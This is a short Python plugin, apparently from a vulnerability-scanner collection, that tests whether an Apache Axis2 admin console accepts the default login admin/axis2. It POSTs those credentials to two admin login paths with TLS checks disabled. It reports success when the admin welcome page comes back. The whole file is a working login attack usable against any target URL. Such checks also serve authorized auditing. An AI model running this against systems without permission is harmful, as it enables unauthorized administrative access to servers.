#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Axis2 Default Login',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/axis2-admin/login','/axis2/axis2-admin/login']
  url1 = url + targets[0]
  url2 = url + targets[1]
  data1 = 'loginUsername=admin&loginPassword=axis2'
  data2 = 'userName=admin&password=axis2&submit=+Login+'
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'<h1>Welcome to Axis2 Web Admin Module !!</h1>',res.text,re.S):
      ret['huixian'] = '账号/密码：admin/axis2'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    ret['url'] = url2
    res=requests.post(url=url2,headers=headers,data=data2,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'<h1>Welcome to Axis2 Web Admin Module !!</h1>',res.text,re.S):
      ret['huixian'] = '账号/密码：admin/axis2'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret